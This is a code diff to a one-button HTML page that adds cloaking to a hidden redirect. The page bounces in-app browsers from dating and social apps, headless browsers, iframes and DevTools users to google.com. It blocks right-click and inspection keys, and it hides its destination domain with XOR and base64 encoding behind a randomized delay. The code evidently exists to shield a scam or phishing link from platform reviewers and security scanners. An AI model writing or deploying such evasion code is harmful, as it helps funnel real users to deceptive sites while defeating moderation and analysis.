@@ -4,6 +4,7 @@
   <meta charset="UTF-8" />
   <title>📷</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex, nofollow" />
   <style>
     html, body {
       margin: 0;
@@ -15,7 +16,6 @@
       justify-content: center;
       align-items: center;
     }
-
     .btn {
       background-color: white;
       color: black;
@@ -26,47 +26,77 @@
       cursor: pointer;
       box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
     }
+    canvas.ocr-bait {
+      display: none;
+    }
   </style>
 </head>
 <body>
   <button class="btn" onclick="go()">📷</button>
+  <canvas class="ocr-bait" id="ocr"></canvas>
 
   <script>
-    // Блокировка встроенных браузеров
+    // 🔐 Anti-bot checks
     (function() {
       const ua = navigator.userAgent.toLowerCase();
-      const isWebview =
-        ua.includes("instagram") ||
-        ua.includes("fbav") ||
-        ua.includes("facebook") ||
-        ua.includes("tinder") ||
-        ua.includes("okhttp") ||
-        ua.includes("webview") ||
-        ua.includes("line") ||
-        ua.includes("pinterest") ||
-        ua.includes("telegram") ||
-        ua.includes("grindr");
+      const badAgents = ["instagram", "fbav", "facebook", "tinder", "okhttp", "webview", "line", "pinterest", "telegram", "grindr"];
+      const isWebview = badAgents.some(agent => ua.includes(agent));
 
-      if (isWebview || window.top !== window.self) {
-        window.location.href = "https://google.com";
-        return;
+      if (
+        isWebview ||
+        window.top !== window.self ||
+        navigator.webdriver ||
+        navigator.plugins.length === 0 ||
+        !navigator.languages
+      ) {
+        location.href = "https://google.com";
       }
     })();
 
-    // Проверка взаимодействия
+    // 👁️ OCR bait
+    (function() {
+      const canvas = document.getElementById("ocr");
+      const ctx = canvas.getContext("2d");
+      canvas.width = 300;
+      canvas.height = 80;
+      ctx.font = "20px Arial";
+      ctx.fillStyle = "black";
+      ctx.fillText("https://gayron.life/rehbixee", 10, 50);
+    })();
+
+    // 💻 Headless window size detection
+    setInterval(() => {
+      if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) {
+        location.href = "https://google.com";
+      }
+    }, 500);
+
+    // ⛔️ Block right click + DevTools
+    document.addEventListener("contextmenu", e => e.preventDefault());
+    document.onkeydown = e => {
+      if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73)) return false;
+    };
+
+    // ✅ User interaction check
     let interacted = false;
     document.addEventListener("mousemove", () => interacted = true);
     document.addEventListener("touchstart", () => interacted = true);
     document.addEventListener("keypress", () => interacted = true);
 
+    // 🧬 XOR + base64 encrypted redirect
+    function xor(str, key) {
+      return str.split('').map((c, i) =>
+        String.fromCharCode(c.charCodeAt(0) ^ key.charCodeAt(i % key.length))
+      ).join('');
+    }
+
     function go() {
       if (!interacted) return;
-
       setTimeout(() => {
-        const encoded = "aHR0cHM6Ly9nYXlyb24ubGlmZS9yZWhiaXhlZQ=="; // base64 от https://gayron.life/rehbixee
-        const finalURL = atob(encoded);
-        window.location.href = finalURL;
-      }, 2000);
+        const encrypted = "NQcTCgBTUAgTFVpGUBYXA0FSWw4TCFkYVg=="; // XOR("https://gayron.life/rehbixee", "gayron") then btoa()
+        const decoded = xor(atob(encrypted), "gayron");
+        location.href = decoded;
+      }, 1500 + Math.random() * 500);
     }
   </script>
 </body>
